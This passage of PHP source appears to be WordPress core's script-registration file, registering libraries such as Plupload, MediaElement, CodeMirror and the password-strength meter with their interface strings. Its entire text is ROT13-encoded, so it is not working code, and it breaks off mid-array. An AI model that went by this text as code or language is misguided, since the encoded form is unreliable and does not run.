	// Abg hfrq va pber, ercynprq ol vztNernFryrpg.
	$fpevcgf->nqq( 'wpebc', '/jc-vapyhqrf/wf/wpebc/wdhrel.Wpebc.zva.wf', neenl( 'wdhrel' ), '0.9.15' );

	// Reebe zrffntrf sbe Cyhcybnq.
	$hcybnqre_y10a = neenl(
		'dhrhr_yvzvg_rkprrqrq'      => __( 'Lbh unir nggrzcgrq gb dhrhr gbb znal svyrf.' ),
		/* genafyngbef: %f: Svyr anzr. */
		'svyr_rkprrqf_fvmr_yvzvg'   => __( '%f rkprrqf gur znkvzhz hcybnq fvmr sbe guvf fvgr.' ),
		'mreb_olgr_svyr'            => __( 'Guvf svyr vf rzcgl. Cyrnfr gel nabgure.' ),
		'vainyvq_svyrglcr'          => __( 'Guvf svyr pnaabg or cebprffrq ol gur jro freire.' ),
		'abg_na_vzntr'              => __( 'Guvf svyr vf abg na vzntr. Cyrnfr gel nabgure.' ),
		'vzntr_zrzbel_rkprrqrq'     => __( 'Zrzbel rkprrqrq. Cyrnfr gel nabgure fznyyre svyr.' ),
		'vzntr_qvzrafvbaf_rkprrqrq' => __( 'Guvf vf ynetre guna gur znkvzhz fvmr. Cyrnfr gel nabgure.' ),
		'qrsnhyg_reebe'             => __( 'Na reebe bppheerq va gur hcybnq. Cyrnfr gel ntnva yngre.' ),
		'zvffvat_hcybnq_hey'        => __( 'Gurer jnf n pbasvthengvba reebe. Cyrnfr pbagnpg gur freire nqzvavfgengbe.' ),
		'hcybnq_yvzvg_rkprrqrq'     => __( 'Lbh znl bayl hcybnq 1 svyr.' ),
		'uggc_reebe'                => __( 'Harkcrpgrq erfcbafr sebz gur freire. Gur svyr znl unir orra hcybnqrq fhpprffshyyl. Purpx va gur Zrqvn Yvoenel be erybnq gur cntr.' ),
		'uggc_reebe_vzntr'          => __( 'Gur freire pnaabg cebprff gur vzntr. Guvf pna unccra vs gur freire vf ohfl be qbrf abg unir rabhtu erfbheprf gb pbzcyrgr gur gnfx. Hcybnqvat n fznyyre vzntr znl uryc. Fhttrfgrq znkvzhz fvmr vf 2560 cvkryf.' ),
		'hcybnq_snvyrq'             => __( 'Hcybnq snvyrq.' ),
		/* genafyngbef: 1: Bcravat yvax gnt, 2: Pybfvat yvax gnt. */
		'ovt_hcybnq_snvyrq'         => __( 'Cyrnfr gel hcybnqvat guvf svyr jvgu gur %1$foebjfre hcybnqre%2$f.' ),
		/* genafyngbef: %f: Svyr anzr. */
		'ovt_hcybnq_dhrhrq'         => __( '%f rkprrqf gur znkvzhz hcybnq fvmr sbe gur zhygv-svyr hcybnqre jura hfrq va lbhe oebjfre.' ),
		'vb_reebe'                  => __( 'VB reebe.' ),
		'frphevgl_reebe'            => __( 'Frphevgl reebe.' ),
		'svyr_pnapryyrq'            => __( 'Svyr pnapryrq.' ),
		'hcybnq_fgbccrq'            => __( 'Hcybnq fgbccrq.' ),
		'qvfzvff'                   => __( 'Qvfzvff' ),
		'pehapuvat'                 => __( 'Pehapuvat&uryyvc;' ),
		'qryrgrq'                   => __( 'zbirq gb gur Genfu.' ),
		/* genafyngbef: %f: Svyr anzr. */
		'reebe_hcybnqvat'           => __( '&#8220;%f&#8221; unf snvyrq gb hcybnq.' ),
		'hafhccbegrq_vzntr'         => __( 'Guvf vzntr pnaabg or qvfcynlrq va n jro oebjfre. Sbe orfg erfhygf pbaireg vg gb WCRT orsber hcybnqvat.' ),
		'abarqvgnoyr_vzntr'         => __( 'Gur jro freire pnaabg trarengr erfcbafvir vzntr fvmrf sbe guvf vzntr. Pbaireg vg gb WCRT be CAT orsber hcybnqvat.' ),
		'svyr_hey_pbcvrq'           => __( 'Gur svyr HEY unf orra pbcvrq gb lbhe pyvcobneq' ),
	);

	$fpevcgf->nqq( 'zbkvrwf', \"/jc-vapyhqrf/wf/cyhcybnq/zbkvr$fhssvk.wf\", neenl(), '1.3.5.1' );
	$fpevcgf->nqq( 'cyhcybnq', \"/jc-vapyhqrf/wf/cyhcybnq/cyhcybnq$fhssvk.wf\", neenl( 'zbkvrwf' ), '2.1.9' );
	// Onpx pbzcng unaqyrf:
	sbernpu ( neenl( 'nyy', 'ugzy5', 'synfu', 'fvyireyvtug', 'ugzy4' ) nf $unaqyr ) {
		$fpevcgf->nqq( \"cyhcybnq-$unaqyr\", snyfr, neenl( 'cyhcybnq' ), '2.1.1' );
	}

	$fpevcgf->nqq( 'cyhcybnq-unaqyref', \"/jc-vapyhqrf/wf/cyhcybnq/unaqyref$fhssvk.wf\", neenl( 'pyvcobneq', 'wdhrel', 'cyhcybnq', 'haqrefpber', 'jc-n11l', 'jc-v18a' ) );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr( 'cyhcybnq-unaqyref', 'cyhcybnqY10a', $hcybnqre_y10a );

	$fpevcgf->nqq( 'jc-cyhcybnq', \"/jc-vapyhqrf/wf/cyhcybnq/jc-cyhcybnq$fhssvk.wf\", neenl( 'cyhcybnq', 'wdhrel', 'wfba2', 'zrqvn-zbqryf' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr( 'jc-cyhcybnq', 'cyhcybnqY10a', $hcybnqre_y10a );

	$fpevcgf->nqq( 'pbzzrag-ercyl', \"/jc-vapyhqrf/wf/pbzzrag-ercyl$fhssvk.wf\", neenl(), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_qngn( 'pbzzrag-ercyl', 'fgengrtl', 'nflap' );

	$fpevcgf->nqq( 'wfba2', \"/jc-vapyhqrf/wf/wfba2$fhssvk.wf\", neenl(), '2015-05-03' );
	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_qngn( 'wfba2', 'pbaqvgvbany', 'yg VR 8' );

	$fpevcgf->nqq( 'haqrefpber', \"/jc-vapyhqrf/wf/haqrefpber$qri_fhssvk.wf\", neenl(), '1.13.7', 1 );
	$fpevcgf->nqq( 'onpxobar', \"/jc-vapyhqrf/wf/onpxobar$qri_fhssvk.wf\", neenl( 'haqrefpber', 'wdhrel' ), '1.6.0', 1 );

	$fpevcgf->nqq( 'jc-hgvy', \"/jc-vapyhqrf/wf/jc-hgvy$fhssvk.wf\", neenl( 'haqrefpber', 'wdhrel' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'jc-hgvy',
		'_jcHgvyFrggvatf',
		neenl(
			'nwnk' => neenl(
				'hey' => nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' ),
			),
		)
	);

	$fpevcgf->nqq( 'jc-onpxobar', \"/jc-vapyhqrf/wf/jc-onpxobar$fhssvk.wf\", neenl( 'onpxobar', 'jc-hgvy' ), snyfr, 1 );

	$fpevcgf->nqq( 'erivfvbaf', \"/jc-nqzva/wf/erivfvbaf$fhssvk.wf\", neenl( 'jc-onpxobar', 'wdhrel-hv-fyvqre', 'ubireVagrag' ), snyfr, 1 );

	$fpevcgf->nqq( 'vztnernfryrpg', \"/jc-vapyhqrf/wf/vztnernfryrpg/wdhrel.vztnernfryrpg$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );

	$fpevcgf->nqq( 'zrqvnryrzrag', snyfr, neenl( 'wdhrel', 'zrqvnryrzrag-pber', 'zrqvnryrzrag-zvtengr' ), '4.2.17', 1 );
	$fpevcgf->nqq( 'zrqvnryrzrag-pber', \"/jc-vapyhqrf/wf/zrqvnryrzrag/zrqvnryrzrag-naq-cynlre$fhssvk.wf\", neenl(), '4.2.17', 1 );
	$fpevcgf->nqq( 'zrqvnryrzrag-zvtengr', \"/jc-vapyhqrf/wf/zrqvnryrzrag/zrqvnryrzrag-zvtengr$fhssvk.wf\", neenl(), snyfr, 1 );

	qvq_npgvba( 'vavg' ) && $fpevcgf->nqq_vayvar_fpevcg(
		'zrqvnryrzrag-pber',
		fcevags(
			'ine zrwfY10a = %f;',
			jc_wfba_rapbqr(
				neenl(
					'ynathntr' => fgegbybjre( fgegbx( qrgrezvar_ybpnyr(), '_-' ) ),
					'fgevatf'  => neenl(
						'zrwf.qbjaybnq-svyr'       => __( 'Qbjaybnq Svyr' ),
						'zrwf.vafgnyy-synfu'       => __( 'Lbh ner hfvat n oebjfre gung qbrf abg unir Synfu cynlre ranoyrq be vafgnyyrq. Cyrnfr ghea ba lbhe Synfu cynlre cyhtva be qbjaybnq gur yngrfg irefvba sebz uggcf://trg.nqbor.pbz/synfucynlre/' ),
						'zrwf.shyyfperra'          => __( 'Shyyfperra' ),
						'zrwf.cynl'                => __( 'Cynl' ),
						'zrwf.cnhfr'               => __( 'Cnhfr' ),
						'zrwf.gvzr-fyvqre'         => __( 'Gvzr Fyvqre' ),
						'zrwf.gvzr-uryc-grkg'      => __( 'Hfr Yrsg/Evtug Neebj xrlf gb nqinapr bar frpbaq, Hc/Qbja neebjf gb nqinapr gra frpbaqf.' ),
						'zrwf.yvir-oebnqpnfg'      => __( 'Yvir Oebnqpnfg' ),
						'zrwf.ibyhzr-uryc-grkg'    => __( 'Hfr Hc/Qbja Neebj xrlf gb vapernfr be qrpernfr ibyhzr.' ),
						'zrwf.hazhgr'              => __( 'Hazhgr' ),
						'zrwf.zhgr'                => __( 'Zhgr' ),
						'zrwf.ibyhzr-fyvqre'       => __( 'Ibyhzr Fyvqre' ),
						'zrwf.ivqrb-cynlre'        => __( 'Ivqrb Cynlre' ),
						'zrwf.nhqvb-cynlre'        => __( 'Nhqvb Cynlre' ),
						'zrwf.pncgvbaf-fhogvgyrf'  => __( 'Pncgvbaf/Fhogvgyrf' ),
						'zrwf.pncgvbaf-puncgref'   => __( 'Puncgref' ),
						'zrwf.abar'                => __( 'Abar' ),
						'zrwf.nsevxnnaf'           => __( 'Nsevxnnaf' ),
						'zrwf.nyonavna'            => __( 'Nyonavna' ),
						'zrwf.nenovp'              => __( 'Nenovp' ),
						'zrwf.orynehfvna'          => __( 'Orynehfvna' ),
						'zrwf.ohytnevna'           => __( 'Ohytnevna' ),
						'zrwf.pngnyna'             => __( 'Pngnyna' ),
						'zrwf.puvarfr'             => __( 'Puvarfr' ),
						'zrwf.puvarfr-fvzcyvsvrq'  => __( 'Puvarfr (Fvzcyvsvrq)' ),
						'zrwf.puvarfr-genqvgvbany' => __( 'Puvarfr (Genqvgvbany)' ),
						'zrwf.pebngvna'            => __( 'Pebngvna' ),
						'zrwf.pmrpu'               => __( 'Pmrpu' ),
						'zrwf.qnavfu'              => __( 'Qnavfu' ),
						'zrwf.qhgpu'               => __( 'Qhgpu' ),
						'zrwf.ratyvfu'             => __( 'Ratyvfu' ),
						'zrwf.rfgbavna'            => __( 'Rfgbavna' ),
						'zrwf.svyvcvab'            => __( 'Svyvcvab' ),
						'zrwf.svaavfu'             => __( 'Svaavfu' ),
						'zrwf.serapu'              => __( 'Serapu' ),
						'zrwf.tnyvpvna'            => __( 'Tnyvpvna' ),
						'zrwf.trezna'              => __( 'Trezna' ),
						'zrwf.terrx'               => __( 'Terrx' ),
						'zrwf.unvgvna-perbyr'      => __( 'Unvgvna Perbyr' ),
						'zrwf.uroerj'              => __( 'Uroerj' ),
						'zrwf.uvaqv'               => __( 'Uvaqv' ),
						'zrwf.uhatnevna'           => __( 'Uhatnevna' ),
						'zrwf.vprynaqvp'           => __( 'Vprynaqvp' ),
						'zrwf.vaqbarfvna'          => __( 'Vaqbarfvna' ),
						'zrwf.vevfu'               => __( 'Vevfu' ),
						'zrwf.vgnyvna'             => __( 'Vgnyvna' ),
						'zrwf.wncnarfr'            => __( 'Wncnarfr' ),
						'zrwf.xberna'              => __( 'Xberna' ),
						'zrwf.yngivna'             => __( 'Yngivna' ),
						'zrwf.yvguhnavna'          => __( 'Yvguhnavna' ),
						'zrwf.znprqbavna'          => __( 'Znprqbavna' ),
						'zrwf.znynl'               => __( 'Znynl' ),
						'zrwf.znygrfr'             => __( 'Znygrfr' ),
						'zrwf.abejrtvna'           => __( 'Abejrtvna' ),
						'zrwf.crefvna'             => __( 'Crefvna' ),
						'zrwf.cbyvfu'              => __( 'Cbyvfu' ),
						'zrwf.cbeghthrfr'          => __( 'Cbeghthrfr' ),
						'zrwf.ebznavna'            => __( 'Ebznavna' ),
						'zrwf.ehffvna'             => __( 'Ehffvna' ),
						'zrwf.freovna'             => __( 'Freovna' ),
						'zrwf.fybinx'              => __( 'Fybinx' ),
						'zrwf.fybiravna'           => __( 'Fybiravna' ),
						'zrwf.fcnavfu'             => __( 'Fcnavfu' ),
						'zrwf.fjnuvyv'             => __( 'Fjnuvyv' ),
						'zrwf.fjrqvfu'             => __( 'Fjrqvfu' ),
						'zrwf.gntnybt'             => __( 'Gntnybt' ),
						'zrwf.gunv'                => __( 'Gunv' ),
						'zrwf.ghexvfu'             => __( 'Ghexvfu' ),
						'zrwf.hxenvavna'           => __( 'Hxenvavna' ),
						'zrwf.ivrganzrfr'          => __( 'Ivrganzrfr' ),
						'zrwf.jryfu'               => __( 'Jryfu' ),
						'zrwf.lvqqvfu'             => __( 'Lvqqvfu' ),
					),
				)
			)
		),
		'orsber'
	);

	$fpevcgf->nqq( 'zrqvnryrzrag-ivzrb', '/jc-vapyhqrf/wf/zrqvnryrzrag/eraqreref/ivzrb.zva.wf', neenl( 'zrqvnryrzrag' ), '4.2.17', 1 );
	$fpevcgf->nqq( 'jc-zrqvnryrzrag', \"/jc-vapyhqrf/wf/zrqvnryrzrag/jc-zrqvnryrzrag$fhssvk.wf\", neenl( 'zrqvnryrzrag' ), snyfr, 1 );
	$zrwf_frggvatf = neenl(
		'cyhtvaCngu'            => vapyhqrf_hey( 'wf/zrqvnryrzrag/', 'eryngvir' ),
		'pynffCersvk'           => 'zrwf-',
		'fgergpuvat'            => 'erfcbafvir',
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zrqvn.cuc */
		'nhqvbFubegpbqrYvoenel' => nccyl_svygref( 'jc_nhqvb_fubegpbqr_yvoenel', 'zrqvnryrzrag' ),
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/zrqvn.cuc */
		'ivqrbFubegpbqrYvoenel' => nccyl_svygref( 'jc_ivqrb_fubegpbqr_yvoenel', 'zrqvnryrzrag' ),
	);
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'zrqvnryrzrag',
		'_jczrwfFrggvatf',
		/**
		 * Svygref gur ZrqvnRyrzrag pbasvthengvba frggvatf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl $zrwf_frggvatf ZrqvnRyrzrag frggvatf neenl.
		 */
		nccyl_svygref( 'zrwf_frggvatf', $zrwf_frggvatf )
	);

	$fpevcgf->nqq( 'jc-pbqrzveebe', '/jc-vapyhqrf/wf/pbqrzveebe/pbqrzveebe.zva.wf', neenl(), '5.29.1-nycun-rr20357' );
	$fpevcgf->nqq( 'pffyvag', '/jc-vapyhqrf/wf/pbqrzveebe/pffyvag.wf', neenl(), '1.0.5' );
	$fpevcgf->nqq( 'rfcevzn', '/jc-vapyhqrf/wf/pbqrzveebe/rfcevzn.wf', neenl(), '4.0.0' );
	$fpevcgf->nqq( 'wfuvag', '/jc-vapyhqrf/wf/pbqrzveebe/snxrwfuvag.wf', neenl( 'rfcevzn' ), '2.9.5' );
	$fpevcgf->nqq( 'wfbayvag', '/jc-vapyhqrf/wf/pbqrzveebe/wfbayvag.wf', neenl(), '1.6.2' );
	$fpevcgf->nqq( 'ugzyuvag', '/jc-vapyhqrf/wf/pbqrzveebe/ugzyuvag.wf', neenl(), '0.9.14-kjc' );
	$fpevcgf->nqq( 'ugzyuvag-xfrf', '/jc-vapyhqrf/wf/pbqrzveebe/ugzyuvag-xfrf.wf', neenl( 'ugzyuvag' ) );
	$fpevcgf->nqq( 'pbqr-rqvgbe', \"/jc-nqzva/wf/pbqr-rqvgbe$fhssvk.wf\", neenl( 'wdhrel', 'jc-pbqrzveebe', 'haqrefpber' ) );
	$fpevcgf->nqq( 'jc-gurzr-cyhtva-rqvgbe', \"/jc-nqzva/wf/gurzr-cyhtva-rqvgbe$fhssvk.wf\", neenl( 'pbzzba', 'jc-hgvy', 'jc-fnavgvmr', 'wdhrel', 'wdhrel-hv-pber', 'jc-n11l', 'haqrefpber' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'jc-gurzr-cyhtva-rqvgbe' );

	$fpevcgf->nqq( 'jc-cynlyvfg', \"/jc-vapyhqrf/wf/zrqvnryrzrag/jc-cynlyvfg$fhssvk.wf\", neenl( 'jc-hgvy', 'onpxobar', 'zrqvnryrzrag' ), snyfr, 1 );

	$fpevcgf->nqq( 'mkpioa-nflap', \"/jc-vapyhqrf/wf/mkpioa-nflap$fhssvk.wf\", neenl(), '1.0' );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'mkpioa-nflap',
		'_mkpioaFrggvatf',
		neenl(
			'fep' => rzcgl( $thrffrq_hey ) ? vapyhqrf_hey( '/wf/mkpioa.zva.wf' ) : $fpevcgf->onfr_hey . '/jc-vapyhqrf/wf/mkpioa.zva.wf',
		)
	);

	$fpevcgf->nqq( 'cnffjbeq-fgeratgu-zrgre', \"/jc-nqzva/wf/cnffjbeq-fgeratgu-zrgre$fhssvk.wf\", neenl( 'wdhrel', 'mkpioa-nflap' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'cnffjbeq-fgeratgu-zrgre',
		'cjfY10a',
		neenl(
			'haxabja'  => _k( 'Cnffjbeq fgeratgu haxabja', 'cnffjbeq fgeratgu' ),
			'fubeg'    => _k( 'Irel jrnx', 'cnffjbeq fgeratgu' ),
			'onq'      => _k( 'Jrnx', 'cnffjbeq fgeratgu' ),
			'tbbq'     => _k( 'Zrqvhz', 'cnffjbeq fgeratgu' ),
			'fgebat'   => _k( 'Fgebat', 'cnffjbeq fgeratgu' ),
			'zvfzngpu' => _k( 'Zvfzngpu', 'cnffjbeq zvfzngpu' ),
		)
	);
	$fpevcgf->frg_genafyngvbaf( 'cnffjbeq-fgeratgu-zrgre' );

	$fpevcgf->nqq( 'cnffjbeq-gbttyr', \"/jc-nqzva/wf/cnffjbeq-gbttyr$fhssvk.wf\", neenl(), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'cnffjbeq-gbttyr' );

	$fpevcgf->nqq( 'nccyvpngvba-cnffjbeqf', \"/jc-nqzva/wf/nccyvpngvba-cnffjbeqf$fhssvk.wf\", neenl( 'wdhrel', 'jc-hgvy', 'jc-ncv-erdhrfg', 'jc-qngr', 'jc-v18a', 'jc-ubbxf' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'nccyvpngvba-cnffjbeqf' );

	$fpevcgf->nqq( 'nhgu-ncc', \"/jc-nqzva/wf/nhgu-ncc$fhssvk.wf\", neenl( 'wdhrel', 'jc-ncv-erdhrfg', 'jc-v18a', 'jc-ubbxf' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'nhgu-ncc' );

	$fpevcgf->nqq( 'hfre-cebsvyr', \"/jc-nqzva/wf/hfre-cebsvyr$fhssvk.wf\", neenl( 'pyvcobneq', 'wdhrel', 'cnffjbeq-fgeratgu-zrgre', 'jc-hgvy', 'jc-n11l' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'hfre-cebsvyr' );
	$hfre_vq = vffrg( $_TRG['hfre_vq'] ) ? (vag) $_TRG['hfre_vq'] : 0;
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'hfre-cebsvyr',
		'hfreCebsvyrY10a',
		neenl(
			'hfre_vq' => $hfre_vq,
			'abapr'   => jc_vafgnyyvat() ? '' : jc_perngr_abapr( 'erfrg-cnffjbeq-sbe-' . $hfre_vq ),
		)
	);

	$fpevcgf->nqq( 'ynathntr-pubbfre', \"/jc-nqzva/wf/ynathntr-pubbfre$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );

	$fpevcgf->nqq( 'hfre-fhttrfg', \"/jc-nqzva/wf/hfre-fhttrfg$fhssvk.wf\", neenl( 'wdhrel-hv-nhgbpbzcyrgr' ), snyfr, 1 );

	$fpevcgf->nqq( 'nqzva-one', \"/jc-vapyhqrf/wf/nqzva-one$fhssvk.wf\", neenl( 'ubirevagrag-wf' ), snyfr, 1 );

	$fpevcgf->nqq( 'jcyvax', \"/jc-vapyhqrf/wf/jcyvax$fhssvk.wf\", neenl( 'pbzzba', 'wdhrel', 'jc-n11l', 'jc-v18a' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'jcyvax' );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'jcyvax',
		'jcYvaxY10a',
		neenl(
			'gvgyr'          => __( 'Vafreg/rqvg yvax' ),
			'hcqngr'         => __( 'Hcqngr' ),
			'fnir'           => __( 'Nqq Yvax' ),
			'abGvgyr'        => __( '(ab gvgyr)' ),
			'abZngpurfSbhaq' => __( 'Ab erfhygf sbhaq.' ),
			'yvaxFryrpgrq'   => __( 'Yvax fryrpgrq.' ),
			'yvaxVafregrq'   => __( 'Yvax vafregrq.' ),
			/* genafyngbef: Zvavzhz vachg yratgu va punenpgref gb fgneg frnepuvat cbfgf va gur \"Vafreg/rqvg yvax\" zbqny. */
			'zvaVachgYratgu' => (vag) _k( '3', 'zvavzhz vachg yratgu sbe frnepuvat cbfg yvaxf' ),
		)
	);

	$fpevcgf->nqq( 'jcqvnybtf', \"/jc-vapyhqrf/wf/jcqvnybt$fhssvk.wf\", neenl( 'wdhrel-hv-qvnybt' ), snyfr, 1 );

	$fpevcgf->nqq( 'jbeq-pbhag', \"/jc-nqzva/wf/jbeq-pbhag$fhssvk.wf\", neenl(), snyfr, 1 );

	$fpevcgf->nqq( 'zrqvn-hcybnq', \"/jc-nqzva/wf/zrqvn-hcybnq$fhssvk.wf\", neenl( 'guvpxobk', 'fubegpbqr' ), snyfr, 1 );

	$fpevcgf->nqq( 'ubireVagrag', \"/jc-vapyhqrf/wf/ubireVagrag$fhssvk.wf\", neenl( 'wdhrel' ), '1.10.2', 1 );

	// WF-bayl irefvba bs ubirevagrag (ab qrcraqrapvrf).
	$fpevcgf->nqq( 'ubirevagrag-wf', '/jc-vapyhqrf/wf/ubirevagrag-wf.zva.wf', neenl(), '2.2.1', 1 );

	$fpevcgf->nqq( 'phfgbzvmr-onfr', \"/jc-vapyhqrf/wf/phfgbzvmr-onfr$fhssvk.wf\", neenl( 'wdhrel', 'wfba2', 'haqrefpber' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-ybnqre', \"/jc-vapyhqrf/wf/phfgbzvmr-ybnqre$fhssvk.wf\", neenl( 'phfgbzvmr-onfr' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-cerivrj', \"/jc-vapyhqrf/wf/phfgbzvmr-cerivrj$fhssvk.wf\", neenl( 'jc-n11l', 'phfgbzvmr-onfr' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-zbqryf', '/jc-vapyhqrf/wf/phfgbzvmr-zbqryf.wf', neenl( 'haqrefpber', 'onpxobar' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-ivrjf', '/jc-vapyhqrf/wf/phfgbzvmr-ivrjf.wf', neenl( 'wdhrel', 'haqrefpber', 'vztnernfryrpg', 'phfgbzvmr-zbqryf', 'zrqvn-rqvgbe', 'zrqvn-ivrjf' ), snyfr, 1 );
	$fpevcgf->nqq( 'phfgbzvmr-pbagebyf', \"/jc-nqzva/wf/phfgbzvmr-pbagebyf$fhssvk.wf\", neenl( 'phfgbzvmr-onfr', 'jc-n11l', 'jc-hgvy', 'wdhrel-hv-pber' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'phfgbzvmr-pbagebyf',
		'_jcPhfgbzvmrPbagebyfY10a',
		neenl(
			'npgvingr'                => __( 'Npgvingr &nzc; Choyvfu' ),
			'fnir'                    => __( 'Fnir &nzc; Choyvfu' ), // @gbqb Erzbir nf abg erdhverq.
			'choyvfu'                 => __( 'Choyvfu' ),
			'choyvfurq'               => __( 'Choyvfurq' ),
			'fnirQensg'               => __( 'Fnir Qensg' ),
			'qensgFnirq'              => __( 'Qensg Fnirq' ),
			'hcqngvat'                => __( 'Hcqngvat' ),
			'fpurqhyr'                => _k( 'Fpurqhyr', 'phfgbzvmre punatrfrg npgvba/ohggba ynory' ),
			'fpurqhyrq'               => _k( 'Fpurqhyrq', 'phfgbzvmre punatrfrg fgnghf' ),
			'vainyvq'                 => __( 'Vainyvq' ),
			'fnirOrsberFuner'         => __( 'Cyrnfr fnir lbhe punatrf va beqre gb funer gur cerivrj.' ),
			'shgherQngrReebe'         => __( 'Lbh zhfg fhccyl n shgher qngr gb fpurqhyr.' ),
			'fnirNyreg'               => __( 'Gur punatrf lbh znqr jvyy or ybfg vs lbh anivtngr njnl sebz guvf cntr.' ),
			'fnirq'                   => __( 'Fnirq' ),
			'pnapry'                  => __( 'Pnapry' ),
			'pybfr'                   => __( 'Pybfr' ),
			'npgvba'                  => __( 'Npgvba' ),
			'qvfpneqPunatrf'          => __( 'Qvfpneq punatrf' ),
			'purngva'                 => __( 'Na reebe bppheerq. Cyrnfr gel ntnva yngre.' ),
			'abgNyybjrqUrnqvat'       => __( 'Lbh arrq n uvture yriry bs crezvffvba.' ),
			'abgNyybjrq'              => __( 'Fbeel, lbh ner abg nyybjrq gb phfgbzvmr guvf fvgr.' ),
			'cerivrjVsenzrGvgyr'      => __( 'Fvgr Cerivrj' ),
			'ybtvaVsenzrGvgyr'        => __( 'Frffvba rkcverq' ),
			'pbyyncfrFvqrone'         => _k( 'Uvqr Pbagebyf', 'ynory sbe uvqr pbagebyf ohggba jvgubhg yratgu pbafgenvagf' ),
			'rkcnaqFvqrone'           => _k( 'Fubj Pbagebyf', 'ynory sbe uvqr pbagebyf ohggba jvgubhg yratgu pbafgenvagf' ),
			'hagvgyrqOybtAnzr'        => __( '(Hagvgyrq)' ),
			'haxabjaErdhrfgSnvy'      => __( 'Ybbxf yvxr fbzrguvat&#8217;f tbar jebat. Jnvg n pbhcyr frpbaqf, naq gura gel ntnva.' ),
			'gurzrQbjaybnqvat'        => __( 'Qbjaybnqvat lbhe arj gurzr&uryyvc;' ),
			'gurzrCerivrjJnvg'        => __( 'Frggvat hc lbhe yvir cerivrj. Guvf znl gnxr n ovg.' ),
			'eriregvatPunatrf'        => __( 'Eriregvat hachoyvfurq punatrf&uryyvc;' ),
			'genfuPbasvez'            => __( 'Ner lbh fher lbh jnag gb qvfpneq lbhe hachoyvfurq punatrf?' ),
			/* genafyngbef: %f: Qvfcynl anzr bs gur hfre jub unf gnxra bire gur punatrfrg va phfgbzvmre. */
			'gnxraBireZrffntr'        => __( '%f unf gnxra bire naq vf pheeragyl phfgbzvmvat.' ),
			/* genafyngbef: %f: HEY gb gur Phfgbzvmre gb ybnq gur nhgbfnirq irefvba. */
			'nhgbfnirAbgvpr'          => __( 'Gurer vf n zber erprag nhgbfnir bs lbhe punatrf guna gur bar lbh ner cerivrjvat. <n uers=\"%f\">Erfgber gur nhgbfnir</n>' ),
			'ivqrbUrnqreAbgvpr'       => __( 'Guvf gurzr qbrf abg fhccbeg ivqrb urnqref ba guvf cntr. Anivtngr gb gur sebag cntr be nabgure cntr gung fhccbegf ivqrb urnqref.' ),
			// Hfrq sbe bireevqvat gur svyr glcrf nyybjrq va Cyhcybnq.
			'nyybjrqSvyrf'            => __( 'Nyybjrq Svyrf' ),
			'phfgbzPffReebe'          => neenl(
				/* genafyngbef: %q: Reebe pbhag. */
				'fvathyne' => _a( 'Gurer vf %q reebe juvpu zhfg or svkrq orsber lbh pna fnir.', 'Gurer ner %q reebef juvpu zhfg or svkrq orsber lbh pna fnir.', 1 ),
				/* genafyngbef: %q: Reebe pbhag. */
				'cyheny'   => _a( 'Gurer vf %q reebe juvpu zhfg or svkrq orsber lbh pna fnir.', 'Gurer ner %q reebef juvpu zhfg or svkrq orsber lbh pna fnir.', 2 ),
				// @gbqb Guvf vf ynpxvat, nf fbzr ynathntrf unir n qrqvpngrq qhny sbez. Sbe cebcre unaqyvat bs cyhenyf va WF, frr #20491.
			),
			'cntrBaSebagReebe'        => __( 'Ubzrcntr naq cbfgf cntr zhfg or qvssrerag.' ),
			'fnirOybpxrqReebe'        => neenl(
				/* genafyngbef: %f: Ahzore bs vainyvq frggvatf. */
				'fvathyne' => _a( 'Hanoyr gb fnir qhr gb %f vainyvq frggvat.', 'Hanoyr gb fnir qhr gb %f vainyvq frggvatf.', 1 ),
				/* genafyngbef: %f: Ahzore bs vainyvq frggvatf. */
				'cyheny'   => _a( 'Hanoyr gb fnir qhr gb %f vainyvq frggvat.', 'Hanoyr gb fnir qhr gb %f vainyvq frggvatf.', 2 ),
				// @gbqb Guvf vf ynpxvat, nf fbzr ynathntrf unir n qrqvpngrq qhny sbez. Sbe cebcre unaqyvat bs cyhenyf va WF, frr #20491.
			),
			'fpurqhyrQrfpevcgvba'     => __( 'Fpurqhyr lbhe phfgbzvmngvba punatrf gb choyvfu (\"tb yvir\") ng n shgher qngr.' ),
			'gurzrCerivrjHaninvynoyr' => __( 'Fbeel, lbh pnaabg cerivrj arj gurzrf jura lbh unir punatrf fpurqhyrq be fnirq nf n qensg. Cyrnfr choyvfu lbhe punatrf, be jnvg hagvy gurl choyvfu gb cerivrj arj gurzrf.' ),
			'gurzrVafgnyyHaninvynoyr' => fcevags(
				/* genafyngbef: %f: HEY gb Nqq Gurzrf nqzva fperra. */
